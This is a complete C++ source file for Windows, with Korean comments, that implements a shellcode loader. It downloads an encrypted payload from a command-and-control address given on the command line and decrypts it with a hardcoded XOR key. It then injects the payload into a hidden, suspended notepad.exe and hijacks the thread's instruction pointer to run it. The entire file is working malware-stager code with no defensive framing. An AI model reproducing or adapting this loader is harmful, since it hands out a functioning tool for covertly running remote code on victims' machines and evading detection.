#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wininet.h>
#include <iostream>
#pragma comment(lib, "wininet.lib")
using namespace std;

// 쉘코드 복호화 함수
void xor_encrypt_decrypt(uint8_t* data, size_t data_len, const char* key) {
	size_t key_len = strlen(key);
	for (size_t i = 0; i < data_len; i++) {
		data[i] ^= key[i % key_len];
	}
}

// 페이로드를 HTTP로 다운로드
unsigned char* downloadBinary(const char* serverAddr, DWORD* outSize) {
	if (!outSize) {
		wcout << L"outSize is null" << endl;
		return nullptr;
	}
	*outSize = 0;

	// 브라우저 핸들 생성
	HINTERNET hInternet = InternetOpenA(
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0
	);
	// 브라우저 핸들 생성 실패 예외처리
	if (!hInternet) {
		wcout << L"Failed to get Internet handle" << endl;
		return nullptr;
	}

	// 브라우저 url 접속 핸들 생성
	HINTERNET hUrl = InternetOpenUrlA(
		hInternet, serverAddr, NULL, 0,
		INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0
	);
	// 브라우저 url 접속 핸들 생성 실패 예외처리
	if (!hUrl) {
		wcout << L"Failed to get InternetOpenUrl handle" << endl;
		InternetCloseHandle(hInternet);
		return nullptr;
	}

	// 다운로드 받을 버퍼, 읽은 바이트 변수 지정
	DWORD bytesRead = 0;
	BYTE buffer[4096];
	string fullData;
	// 읽을 수 있는 바이트가 0일 때까지 읽어서 fullData에 저장
	while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
		fullData.append((char*)buffer, bytesRead);
	}

	// 브라우저 핸들 종료
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);

	// 읽은 데이터가 빈값일 경우 예외 처리
	if (fullData.empty()) {
		return nullptr;
	}

	// 형변환을 위해 변수 이동
	unsigned char* result = new unsigned char[fullData.size()];
	memcpy(result, fullData.data(), fullData.size());
	*outSize = fullData.size();
	return result;
}

// 프로세스 핸들 구조체
struct ProcessHandles {
	HANDLE hProcess;
	HANDLE hThread;
	DWORD processId;
	DWORD threadId;
};

// 일시정지 상태의 프로세스 생성
ProcessHandles* createSuspendedProcess(const char* processPath) {
	if (!processPath) {
		cout << "processPath is null" << endl;
		return nullptr;
	}

	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };

	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	if (!CreateProcessA(
		processPath, NULL, NULL, NULL, FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL, NULL, &si, &pi
	)) {
		cout << "CreateProcessA failed. Error: " << GetLastError() << endl;
		return nullptr;
	}

	cout << "Process created (PID: " << pi.dwProcessId << ")" << endl;

	ProcessHandles* handles = new ProcessHandles;
	handles->hProcess = pi.hProcess;
	handles->hThread = pi.hThread;
	handles->processId = pi.dwProcessId;
	handles->threadId = pi.dwThreadId;

	return handles;
}

LPVOID allocRemoteMemory(HANDLE hProc, SIZE_T dataSize) {
	LPVOID exec = VirtualAllocEx(
		hProc, NULL, dataSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!exec) {
		wcout << L"Failed to get Memory buffer" << endl;
		return 0;
	}
	return exec;
}

BOOL writeRemoteMemory(HANDLE hProc, LPVOID dest, void* data, SIZE_T size) {
	// 쓴 데이터 크기 초기화
	SIZE_T written = 0;
	if (!WriteProcessMemory(hProc, dest, data, size, &written)) {
		wcout << L"Failed to write memory" << endl;
		return FALSE;
	}
	wcout << L"Written " << written << L" bytes" << endl;
	return TRUE;
}

int main(int argc, const char* argv[]) {
	// 페이로드 다운로드
	if (argc != 2) {
		cout << "<c2 address>" << endl;
		return 0;
	}

	DWORD dataSize = 0;
	unsigned char* data = downloadBinary(argv[1], &dataSize);
	
	// 페이로드 다운로드 실패 예외처리
	if (data == nullptr) {
		cout << "Failed to get a binary" << endl;
		return 0;
	}

	// 현재 프로세스 컨텍스트에서 자식 프로세스 생성
	ProcessHandles* proc = createSuspendedProcess("C:\\Windows\\System32\\notepad.exe");
	
	// 자식 프로세스 생성 실패 예외처리
	if (!proc) {
		cout << "Failed to create process" << endl;
		delete[] data;
		return 0;
	}

	// 쓰레드 생성 실패 예외처리
	if (!proc->hThread) {
		printf("Error open thread.\n");
		delete[] data;
		CloseHandle(proc->hProcess);
		CloseHandle(proc->hThread);
		delete proc;
		return 0;
	}

	// 자식 프로세스에 가상 메모리 할당
	LPVOID remoteShellcode = allocRemoteMemory(proc->hProcess, dataSize);
	if (!remoteShellcode) {
		cout << "Failed to allocate remote memory" << endl;
		CloseHandle(proc->hThread);
		CloseHandle(proc->hProcess);
		delete proc;
		delete[] data;
		return 0;
	}
	printf("Memory allocated at: %p\n", remoteShellcode);

	// 페이로드 복호화
	const char key[] = "mick3y";
	xor_encrypt_decrypt(data, dataSize, key);

	// 자식 프로세스 가상 메모리 주소에 페이로드 삽입
	writeRemoteMemory(proc->hProcess, remoteShellcode, data, dataSize);


	// 일시정지 상태인 현재 쓰레드 컨텍스트에서 모든 레지스터 가져오기
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(proc->hThread, &ctx); 


	// RIP 값을 페이로드가 있는 가상 메모리 주소로 변경 (64bit, 32bit에 따라 분기)
#ifdef _WIN64
	ctx.Rip = (DWORD64)remoteShellcode;
#else
	ctx.Eip = (DWORD)remoteShellcode;
#endif

	SetThreadContext(proc->hThread, &ctx);
	ResumeThread(proc->hThread);
	WaitForSingleObject(proc->hProcess, INFINITE);
	CloseHandle(proc->hThread);
	CloseHandle(proc->hProcess);
	delete proc;
	delete[] data;
	return 0;
}
